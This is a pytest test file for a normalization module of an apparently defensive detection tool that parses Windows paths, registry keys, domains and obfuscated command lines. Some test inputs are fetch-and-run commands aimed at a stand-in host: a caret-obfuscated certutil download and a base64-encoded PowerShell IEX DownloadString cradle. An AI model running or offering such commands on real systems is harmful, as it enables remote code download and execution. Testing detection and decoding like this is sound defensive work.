import base64

import pytest

from sibyl_h0und.normalize import (
    command_line,
    domain,
    file_key,
    program_name,
    registry_path,
    windows_path,
)


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("C:\\Windows\\System32\\CertUtil.EXE", "certutil.exe"),
        ('"C:/Program Files/App/app.exe"', "app.exe"),
        ("rundll32", "rundll32.exe"),
        ("\\\\?\\C:\\Windows\\cmd.exe", "cmd.exe"),
        ("   ", None),
        (None, None),
    ],
)
def test_program_name_reduces_a_path_to_the_lookup_key(value: object, expected: str | None) -> None:
    """Paths, quoting and a missing `.exe` all reduce to the key a pack stores."""
    assert program_name(value) == expected


def test_program_name_applies_aliases_after_normalizing() -> None:
    """An alias maps the normalized name, so callers write aliases in key form."""
    assert program_name("C:\\x\\PWSH", aliases={"pwsh.exe": "powershell.exe"}) == "powershell.exe"


def test_windows_path_keeps_unc_and_collapses_separators() -> None:
    """A UNC share stays distinguishable from a local path after normalization."""
    assert windows_path("\\\\Host\\C$\\\\Tools//a.bat") == "\\\\host\\c$\\tools\\a.bat"
    assert windows_path("C:\\\\Temp\\A.txt") == "c:\\temp\\a.txt"


def test_command_line_removes_carets_and_quotes_and_reads_options() -> None:
    """Obfuscated `cmd` syntax parses to the same program and options as plain syntax."""
    parsed = command_line(
        'c^e^r^t^u^t^i^l -urlcache -split -f "http://evil.example/a b.exe" /out:C:\\x.exe'
    )

    assert parsed is not None
    assert parsed.program == "certutil.exe"
    assert parsed.options == {
        "urlcache": None,
        "split": None,
        "f": "http://evil.example/a b.exe",
        "out": "C:\\x.exe",
    }
    assert parsed.urls == ["http://evil.example/a b.exe"]


def test_command_line_does_not_take_a_unix_path_for_an_option() -> None:
    """A long slash token is a path, not an option."""
    parsed = command_line("bash /usr/local/bin/run.sh")

    assert parsed is not None
    assert parsed.options == {}


@pytest.mark.parametrize("flag", ["-enc", "-EncodedCommand", "-e", "-ec", "/enc"])
def test_powershell_encoded_command_is_decoded(flag: str) -> None:
    """Every accepted abbreviation of `-EncodedCommand` exposes the script and its URLs."""
    script = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/p')"
    encoded = base64.b64encode(script.encode("utf-16-le")).decode()

    parsed = command_line(f"powershell.exe -NoP {flag} {encoded}")

    assert parsed is not None
    assert parsed.decoded == script
    assert parsed.urls == ["http://evil.example/p"]


def test_encoded_command_of_another_program_is_not_decoded() -> None:
    """Only PowerShell gives `-e` that meaning."""
    encoded = base64.b64encode("whoami".encode("utf-16-le")).decode()

    parsed = command_line(f"tool.exe -e {encoded}")

    assert parsed is not None
    assert parsed.decoded is None


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("HTTPS://user@Evil.Example.COM:8443/path?q=1", "evil.example.com"),
        ("mail.example.org.", "mail.example.org"),
        ("bob@corp.example", "corp.example"),
        ("10.0.0.5", None),
        ("localhost", None),
    ],
)
def test_domain_extracts_the_host_name(value: str, expected: str | None) -> None:
    """URLs, e-mail addresses and FQDNs reduce to one host key; IPs are not domains."""
    assert domain(value) == expected


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("HKLM\\Software\\Run", "hkey_local_machine\\software\\run"),
        ("HKEY_LOCAL_MACHINE\\Software\\Run\\*", "hkey_local_machine\\software\\run"),
        ("HKCU\\Software\\Run", "hkey_current_user\\software\\run"),
        ("HKU\\S-1-5-21-1-2-3-1001\\Software\\Run", "hkey_current_user\\software\\run"),
        ("HKEY_USERS\\%%users.sid%%\\Software\\Run", "hkey_current_user\\software\\run"),
        ("HKEY_USERS", "hkey_users"),
        ("HKLM:\\Software\\Run", "hkey_local_machine\\software\\run"),
        ("Registry::HKEY_CURRENT_USER\\Software\\Run", "hkey_current_user\\software\\run"),
        ("HKU\\S-1-5-21-1-2-3-1001_Classes\\CLSID", "hkey_current_user\\software\\classes\\clsid"),
        (
            "HKLM\\System\\ControlSet002\\Services\\x",
            "hkey_local_machine\\system\\currentcontrolset\\services\\x",
        ),
        ("\\REGISTRY\\MACHINE\\SOFTWARE\\a", "hkey_local_machine\\software\\a"),
        ("C:\\Windows\\a.exe", None),
        ("", None),
        (None, None),
    ],
)
def test_registry_path_gives_one_form_for_the_spellings_of_a_key(
    value: object, expected: str | None
) -> None:
    assert registry_path(value) == expected


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("C:\\Windows\\Temp\\RTCore64.SYS", "rtcore64.sys"),
        ("version", "version"),
        ("A" * 64, "a" * 64),
        (" " + "Ab" * 20 + " ", "ab" * 20),
        ("", None),
        (None, None),
    ],
)
def test_file_key_keeps_a_digest_whole_and_reduces_anything_else_to_a_name(
    value: object, expected: str | None
) -> None:
    assert file_key(value) == expected
